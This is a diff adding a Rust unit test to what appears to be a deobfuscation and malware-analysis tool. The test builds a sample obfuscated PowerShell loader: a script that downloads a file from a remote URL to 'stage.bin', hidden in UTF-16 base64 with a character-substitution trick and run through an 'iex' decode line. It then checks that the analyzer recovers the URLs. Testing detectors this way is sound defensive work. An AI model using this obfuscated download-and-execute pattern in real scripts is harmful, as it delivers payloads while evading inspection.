@@ -2900,6 +2900,43 @@ Invoke-WebRequest -Uri $k[0] -OutFile stage.bin
             report.extracted_ps1_normalized.join("\n---\n")
         );
     }
+
+    #[test]
+    fn damaged_powershell_handoff_regex_replaced_b64_chain_resolves_urls() {
+        let decoded = r#"
+$links = @('https://bitbucket.org/team/repo/downloads/3.jpg','https://paste.sensio.no/ApartAirways')
+Invoke-WebRequest -Uri $links[0] -OutFile stage.bin
+"#;
+        let utf16: Vec<u8> = decoded
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD
+            .encode(&utf16)
+            .replace('r', "f#");
+        let script = format!(
+            "\x02\x03\x03\x03\x03\x03hell \"$ddsdgo = '{b64}';iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($ddsdgo.replace('f#','r'))))\""
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+        let urls: Vec<_> = report
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, .. } | Trait::UrlVariable { url: src, .. } => {
+                    Some(src.as_str())
+                }
+                _ => None,
+            })
+            .collect();
+        assert!(
+            urls.contains(&"https://bitbucket.org/team/repo/downloads/3.jpg")
+                && urls.contains(&"https://paste.sensio.no/ApartAirways"),
+            "damaged handoff regex-replaced b64 URLs missed: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
